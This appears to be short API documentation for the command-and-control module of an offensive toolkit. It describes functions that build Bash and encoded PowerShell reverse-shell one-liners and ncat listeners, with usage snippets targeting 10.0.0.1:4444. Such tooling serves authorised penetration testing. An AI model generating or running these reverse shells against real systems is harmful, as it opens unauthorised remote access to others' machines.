# C2 API

Quick command snippets for listeners and reverse shells.

## Functions

- `bash_reverse_shell(lhost, lport) -> str`: Bash one-liner reverse shell.
- `powershell_reverse_shell(lhost, lport) -> str`: Encoded PowerShell reverse shell builder.
- `ncat_listener(port, ssl=False, verbose=False) -> str`: Build an `nc`/`ncat` listener command.

## Python Usage

```python
from ofx.api import c2
print(c2.bash_reverse_shell("10.0.0.1", 4444))
print(c2.ncat_listener(4444, ssl=False))
```

## Workflow Snippet

```yaml
steps:
  - name: generate shell
    run: |
      python - <<'PY'
      from ofx.api import c2
      print(c2.powershell_reverse_shell("10.0.0.1", 4444))
      PY
```
